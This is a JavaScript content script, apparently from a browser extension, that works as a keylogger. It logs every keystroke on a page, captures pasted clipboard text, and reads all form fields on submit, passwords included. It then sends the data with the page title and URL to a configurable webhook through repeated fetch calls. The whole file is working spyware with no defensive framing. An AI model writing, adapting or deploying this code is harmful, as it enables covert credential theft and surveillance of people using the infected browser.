(async () => {
/* SETUP */
const SAVE_INTERVAL = 2500,
	TITLE = document.title || document.URL,
	URL = document.URL;

let webhookUrl = await get("webhookUrl"),
	shouldSave = false,
	lastLog = new Date().getTime(),
	input = "", // Key presses will be concatenated
	messageId;

/* EVENT LISTENERS */

document.addEventListener("keydown", (e) => {
	e = e || window.event;
	const key = e.key;
	log(key.length === 1 ? key : `[${key}]`);
});

// Removed because logs get really hard to read
// document.addEventListener("keyup", (e) => {
// 	e = e || window.event;
// 	const key = e.key;
// 	if (key.length > 1) log(`[Up${key}]`);
// });

document.addEventListener('paste', e => {
	e = e || window.event;
	upload((e.clipboardData || window.clipboardData).getData('text'), "Paste:", "paste");
});

/* FUNCTIONS */
async function upload(content, text, type) {
	if (!webhookUrl) return;
	const edit = messageId && type === "log";
	const msg = {
		"content": text,
		"embeds": [{
			"title": TITLE,
			"description": `\`\`\`${type === "log" || type === "paste" ? "\n" + (content ?? input) : "json\n" + JSON.stringify(content, null, 2)}\`\`\``,
			"url": URL,
			"color": 5814783
		}],
		"attachments": []
	}
	const res = await fetch(edit ? `${webhookUrl}/messages/${messageId}` : `${webhookUrl}?wait=true`, {
		"method": edit ? "PATCH" : "POST",
		"headers": {
			"Content-Type": "application/json"
		},
		"body": JSON.stringify(msg)
	});
	if (!messageId && type === "log") messageId = (await res.json()).id;
}

function log(key) {
	const now = new Date().getTime();
	if (now - lastLog < 10) return;
	input += key;
	shouldSave = true;
	lastLog = now;
}

// Key logs saving
setInterval(() => {
	if (!shouldSave) return;
	upload(null, "Keylogs:", "log");
	shouldSave = false;
}, SAVE_INTERVAL);

// Saving forms
const forms = document.getElementsByTagName("form");
for (let i = 0; i < forms.length; i++) {
	forms[i].addEventListener("submit", function(e) {
		const formData = {};
		formData.FormName = e.target.name;
		formData.FormAction = e.target.action;
		formData.FormElements = {};
		const elements = e.target.elements;
		for (let n = 0; n < elements.length; n++) {
			formData.FormElements[elements[n].name] = elements[n].value;
		}
		upload(formData, "Form:", "form");
	});
}

// Storage
chrome.storage.onChanged.addListener((changes, areaName) => {
	if (areaName !== "local") return;
	webhookUrl = changes.webhookUrl.newValue;
});

async function get(key) {
	return new Promise((resolve, reject) => {
		chrome.storage.local.get([key], function (result) {
			if (result[key] === undefined) {
				reject();
			} else {
				resolve(result[key]);
			}
		});
	});
};
})();